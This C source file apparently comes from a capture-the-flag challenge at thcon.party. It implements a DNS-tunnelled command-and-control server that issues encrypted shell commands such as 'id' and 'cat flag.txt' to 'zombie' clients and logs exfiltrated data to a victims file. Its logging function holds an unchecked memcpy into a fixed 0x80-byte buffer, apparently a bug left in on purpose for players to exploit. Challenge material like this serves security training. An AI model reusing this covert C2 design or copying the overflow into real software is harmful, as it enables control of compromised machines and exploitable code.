#include "server.h"
#include "dns.h"
#include "utils.h"
#include "crypto.h"

int sockfd;

struct dns_packet query;

char * commands[] = {
    "id",
    "hostname",
    "cat $(pwd)/flag.txt"
};

void log_zombie(char *session, char *action, size_t action_size) {
    int filefd;
    char buffer[0x80];
    time_t now;

    if ((filefd = open("/tmp/victims.csv", O_WRONLY | O_APPEND | O_CREAT, 0755)) == -1) {
        perror("open");
        exit(1);
    }

    size_t size = sprintf(buffer, "%ld,%s,", time(NULL), session);
    memcpy(buffer + size, action, action_size);
    size += action_size;

    buffer[action_size] = '\n';

    size++;

    write(filefd, buffer, size);

    close(filefd); 
}

void handle_zombie(struct dns_question *question) {
    struct dns_packet *response;

    if (question->type == TYPE_TXT) {
        char *subdomain = get_nth_part(question->domains, 2);

        if (!strcmp(subdomain, "start")) {
            // Start session generation
            unsigned int session;
            unsigned char key;
            char session_str[0x10] = {0};

            get_random_bytes((char *) &session, sizeof (unsigned int));
            get_random_bytes(&key, sizeof (unsigned char));

            size_t session_size = snprintf(session_str, sizeof (session_str) - 1, "%04x-%02x-%04x", session >> 0x10, key, session & 0xffff);

            log_zombie(session_str, "CONNECT", 7);

            response = resolve_query(&query, question, session_str, session_size);

        } else if (!strcmp(subdomain, "ping")) {
            // Echo Reply handling
            response = resolve_query(&query, question, "pong", 4);
        } else if (!strcmp(subdomain, "data")) {
            // Data channel
            if (question->domains_count > 4) {
                char *session_str = get_nth_part(question->domains, 3);
                unsigned char key = extract_key(session_str);
                char *data = get_nth_part(question->domains, 4);

                size_t length = strlen(data) / 2;
                char *decoded = decode_hex(data);

                decrypt(decoded, length, key);

                log_zombie(session_str, decoded, length);
            }
        } else if (!strcmp(subdomain, "command")) {
            // Command channel
            if (question->domains_count > 4) {
                char *command = commands[atoi(get_nth_part(question->domains, 3))];
                char *session_str = get_nth_part(question->domains, 4);
                unsigned char key = extract_key(session_str);

                log_zombie(session_str, "COMMAND", 7);

                char *encrypted_command = strdup(command);

                size_t length = strlen(encrypted_command);

                encrypt(encrypted_command, length, key);

                char *hex_response = encode_hex(encrypted_command, length);

                response = resolve_query(&query, question, hex_response, strlen(hex_response));
            }
        } else {
            response = resolve_query(&query, question, "NOPE", 4);
        }

        sendto(sockfd, &response->header, response->size + sizeof(struct dns_header), 0, (struct sockaddr *) response->client, response->client_len);
    } else if (question->type == TYPE_A) {
        response = resolve_query(&query, question, "\x01\x03\x03\x07", 4);

        sendto(sockfd, &response->header, response->size + sizeof(struct dns_header), 0, (struct sockaddr *) response->client, response->client_len);
    }
}

void forward_request(struct dns_packet *pkt, char *response, size_t *response_size) {
    int remote_socket;
    struct sockaddr_in saddr;

    if (response == NULL || response_size == NULL) return;

    remote_socket = socket(AF_INET, SOCK_DGRAM, 0);
    if (remote_socket < 0) {
        perror("socket");
        exit(1);
    }

    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(53);
    inet_aton("8.8.8.8", &saddr.sin_addr);

    prepare_header(&pkt->header);

    sendto(remote_socket, &pkt->header, pkt->size + sizeof(struct dns_header), 0, (struct sockaddr *) &saddr, sizeof(struct sockaddr_in));

    socklen_t addr_size = sizeof (struct sockaddr_in);

    *response_size = recvfrom(remote_socket, response, BUFFER_SIZE, 0, (struct sockaddr *) &saddr, &addr_size);
}

void handle_client() {
    struct dns_question *question = parse_request(&query);
    struct domain_list *list = question->domains;
    char *response;
    size_t response_size;

    int forward = should_forward(question);

    if (forward) {
        if (!(response = malloc(BUFFER_SIZE))) {
            perror("malloc");
            exit(1);
        }

        forward_request(&query, response, &response_size);

        sendto(sockfd, response, response_size, 0, (struct sockaddr *) query.client, query.client_len);
    } else {
        handle_zombie(question);
    }
}

int should_forward(struct dns_question *question) {
    if (question->domains_count < 3) return 1;

    struct domain_list *list = question->domains;

    char *tld = get_nth_part(list, 0);
    char *domain = get_nth_part(list, 1);

    if (!(strcmp(tld, "party") == 0 && strcmp(domain, "thcon") == 0)) return 1;

    return 0;
}

void start_server() {

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DEFAULT_PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        exit(1);
    }

    memset(&query, 0, sizeof(query));

    for (;;) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);

        ssize_t query_size = recvfrom(sockfd, &query.header, BUFFER_SIZE, 0, (struct sockaddr *) &client_addr, &client_len);
        
        if (query_size < 0) {
            perror("recvfrom");
            break;
        }

        query.client = &client_addr;
        query.client_len = client_len;
        query.size = query_size - sizeof (struct dns_header);

        if (!fork()) {
            handle_client();
            exit(0);
        }
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    start_server();

    return 0;
}